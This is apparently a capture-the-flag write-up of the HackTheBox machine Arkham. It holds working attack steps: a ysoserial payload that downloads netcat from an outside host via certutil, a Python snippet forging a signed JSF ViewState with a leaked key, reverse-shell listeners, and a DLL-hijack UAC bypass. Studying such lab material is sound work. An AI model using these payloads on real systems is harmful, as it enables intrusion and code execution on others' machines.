---
layout: post
title: "The Key Was in the Backup"
subtitle: "HTB Arkham, where a cracked disk image hands you the server's signing key, a forged ViewState runs your code, and a UAC bypass finishes the job"
date: 2019-08-17 12:00:00 +0000
description: "A backup disk image leaks the secret that signs the server's session state, and a forged ViewState turns that signature into a shell."
image: /assets/og/the-key-was-in-the-backup.png
tags: [hackthebox, writeup]
---

Arkham is a box about a key that should never have left the building. There is a web app that hands its users a sealed token and trusts them to hand it back unopened, the way every Java Server Faces site does. The seal is real, a signature the server checks before it ever looks inside. The problem is that the key to that seal is sitting in a backup, the backup is an encrypted disk image on an open file share, and the password on the encryption is a Batman pun. So you crack the image, you read the signing key off the disk, and now you can seal anything you want. You seal a command. The server checks the signature, sees its own key, trusts the token, and opens it. What falls out is a shell. Then the box makes you do it twice, because the admin account you find is admin in name only until you talk Windows out of its own seatbelt.

```
        A R K H A M   A S Y L U M
        =========================
        \\BatShare\appserver.zip  →  backup.img  (locked)
                   |  "batmanforever"
                   v
        a disk falls open, and on it: the server's signing key
                   |
        forge a ViewState, sign it with the stolen key
                   |
        the server checks the seal, sees itself, and obeys
                   |
                   v
        a shell as alfred. then a password in an old email,
        then a word with UAC until it lets go.
                                            蝠
```

## 0x01 · the open drawer

Four things answer, and the shape is pure Windows with one odd guest.

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http          Apache Tomcat 8.5.37
```

IIS on 80 is a dead end dressed as a homepage. The interesting one is Tomcat on 8080, serving a Java Server Faces app, and the SMB stack on 445, because Windows boxes love to leave a share open. A null session against the shares pays out immediately.

```
$ smbclient -N -L //10.10.10.130/
        Sharename       Type      Comment
        BatShare        Disk
$ smbclient -N //10.10.10.130/BatShare
smb: \> get appserver.zip
```

No password, no fight. The share is named `BatShare` and it holds a single zip. Inside the zip is a note telling you not to lose the file, and a file called `backup.img`. The note is the box waving at you.

## 0x02 · the locked image

`file backup.img` calls it a LUKS encrypted volume, which is the Linux way to encrypt a whole disk. Think of LUKS like a safe with a combination lock welded to the door. You can hold the safe, shake it, photograph it, and it tells you nothing. The only way in is the combination, and there is exactly one combination per door, so the entire attack is a guessing game against that one word.

Guessing is cheap when the theme is loud, and this box screams Batman from the share name down. So you take a wordlist, keep only the lines that smell like the theme, and grind. `bruteforce-luks` exists for precisely this, throwing candidate passphrases at the header until one fits.

```
$ bruteforce-luks -t 8 -f batman_words.txt -v 30 backup.img
Tried passwords: 41523
Password found: batmanforever
```

`batmanforever`. The combination was a movie title. Open the volume and mount it, and a chunk of someone's hard drive appears in your filesystem.

```
$ cryptsetup open backup.img arkham
$ mount /dev/mapper/arkham /mnt/arkham
```

## 0x03 · the key on the disk

Inside the mounted image, past a folder of mask images, sits a directory named `tomcat-stuff`. That is the loot. It holds the configuration files for the JSF app running on 8080, and one of them, `web.xml`, carries the crown jewels.

Here is the thing about Java Server Faces. Every page you load comes with a hidden field called `javax.faces.ViewState`, a blob the server uses to remember the state of your page between clicks. Picture a coat check. You hand over your coat, you get a numbered ticket, and later the ticket gets you your coat back. JSF does the same with page state, except the ticket is a serialized Java object stuffed into your browser. The server hands it to you and trusts you to hand it back unchanged.

That trust is dangerous, because a serialized Java object is not inert. Feed a vulnerable app a hand-built one and it can run code while unpacking it, before anyone checks what it actually is. The only thing standing in the way is that this server signs the ticket. It encrypts the ViewState and stamps it with an HMAC, so a forged ticket gets rejected at the door. The signature is the whole defense.

And the signature key is right here in `web.xml`.

```
org.apache.myfaces.SECRET        = SnNGOTg3Ni0=
org.apache.myfaces.MAC_SECRET    = SnNGOTg3Ni0=
org.apache.myfaces.MAC_ALGORITHM = HmacSHA1
```

That base64 decodes to `JsF9876-`. The same eight bytes encrypt the ViewState with DES and sign it with HMAC-SHA1. The coat-check ticket is stamped with a stamp you are now holding. The seal still works perfectly. It just no longer means anything, because you can make it too.

## 0x04 · the forged ticket

The plan writes itself. Build a malicious serialized object, encrypt it with the stolen DES key, sign the ciphertext with the stolen HMAC key, and post it back as the ViewState. `ysoserial` builds the object, picking a gadget chain (the Commons Collections chains are the classic) that turns deserialization into command execution.

```
$ java -jar ysoserial.jar CommonsCollections5 \
    'cmd /c certutil -urlcache -split -f http://10.10.14.4/nc64.exe C:\Windows\Temp\iceberg-nc.exe' > payload.bin
```

A short Python wrapper does the sealing. It pads the payload to a DES block, encrypts under `JsF9876-`, appends an HMAC-SHA1 of the ciphertext, base64s the whole thing, and URL-encodes it for the form post. The endpoint that takes the bait is `userSubscribe.faces`.

```
ct  = DES.new(b'JsF9876-', DES.MODE_ECB).encrypt(pad(payload))
mac = hmac.new(b'JsF9876-', ct, hashlib.sha1).digest()
vs  = base64.b64encode(ct + mac)
# POST javax.faces.ViewState=<vs> to /userSubscribe.faces
```

The server receives the ticket, recomputes the HMAC with its own key, and the numbers match, because they were always going to match. So it trusts the blob and deserializes it, and the gadget chain fires on the way in. Stage a real reverse shell behind the download and a prompt comes home.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.130
C:\> whoami
arkham\alfred
```

Alfred, the low-privilege account Tomcat runs as. `user.txt` is his.

```
C:\> type C:\Users\Alfred\Desktop\user.txt
████████████████████████████████
```

## 0x05 · the password in the old mail

Alfred cannot do much, so you go looking where people stash things they meant to delete. His Downloads holds a backup zip, and inside it an `.ost` file, which is Outlook's offline copy of a mailbox. An old mailbox is a diary nobody thinks anyone will read.

`readpst` converts the OST into mbox files you can open with a normal mail reader, and the Drafts folder is where the gold sits. There is a draft email with an image attachment, and the image is a screenshot showing a password being set for the `batman` account.

```
$ readpst -r alfred@arkham.local.ost
$ mutt -R -f Drafts.mbox
# the draft's PNG attachment shows: batman / Zx^#QZX+T!123
```

`batman` is in the local Administrators group. That sounds like the end. It is not, and the reason is the most Windows thing on the box.

## 0x06 · admin with the parking brake on

You become batman the clean way, building a credential object from the password and running commands as him over WinRM or `runas`. But when you check what batman can actually do, the access tokens come back filtered. He is an administrator whose admin powers are switched off until something asks for them through a consent prompt. That switch is User Account Control.

Think of UAC like a car with a governor that caps you at 25 miles per hour around town, even though the engine can do a hundred. batman owns a fast car. UAC just will not let him press the pedal down without a key turn at a dashboard you cannot reach over a remote shell, because there is no desktop to click "yes" on. So you do not argue with the governor. You find a wire that bypasses it.

Windows ships a handful of trusted programs that auto-elevate without ever prompting, and some of them are sloppy about where they look for the code they load. `SystemPropertiesAdvanced.exe` is one. It launches with a full admin token and goes hunting for a helper library, `srrstr.dll`, in a folder that batman can write to. So you write your own `srrstr.dll`, drop it where the program looks, and let the trusted program load your code with its unfiltered token.

```
PS> copy iceberg-srrstr.dll C:\Users\batman\AppData\Local\Microsoft\WindowsApps\srrstr.dll
PS> Start-Process SystemPropertiesAdvanced.exe
```

The auto-elevating program loads your DLL, your DLL spawns a shell, and that shell holds the token UAC was hiding.

```
$ nc -lvnp 443
connect to [10.10.10.130]
C:\> whoami /groups | findstr Label
Mandatory Label\High Mandatory Level
C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

The CMSTP bypass gets you to the same place by a different sloppy program. Either way, you did not crack admin. You already were admin. You just had to talk Windows out of its own seatbelt.

## 0x07 · the honest caveat

It is easy to read Arkham as a string of unlucky accidents, but every link is the same mistake wearing a new face, and the mistake is trusting a secret to stay secret. The ViewState signature is real cryptography, done right, DES plus HMAC, and it would have held forever if the key had stayed put. It did not stay put, because someone put a backup of the server on a file share with no password and locked it with a word any fan could guess. The strongest seal in the world is worthless the moment the attacker is holding the stamp, and a backup is just your secrets with a head start.

The UAC step is the one worth sitting with, because nothing there is a bug in the patch-it sense. Auto-elevating binaries that load DLLs from writable folders are documented behavior, and UAC was never marketed as a real security boundary in the first place. It is a speed bump that slows a careless click, not a wall that stops a determined account that already has the password. Treat an administrator password as game over the instant it leaks, because the only thing between that password and SYSTEM is a prompt nobody is around to refuse.

And hold the coat-check picture, because it generalizes past this box. Any time a server hands the client a token and trusts it back, the entire safety of the thing lives in one question. Can the client forge the token. Sign it, encrypt it, HMAC it, do all three. None of it matters if the key is reachable. Secrecy of the key is not a detail of the design. It is the design.

## 0x08 · outro

```
the safe opened because the combination was a punchline.
the disk gave up the stamp the server signs with.
the forged ticket passed because the seal was your own.

then the admin password sat in an old draft,
and windows held the door open with a prompt nobody could answer.

crack the backup. forge the state. bypass the brake. wear black.

                                                            EOF
```

---

*HTB: Arkham, retired 10 Aug 2019. A medium box that plays like a hard one, and a clinic on what happens when the key that signs your session ends up in a backup you forgot to lock.*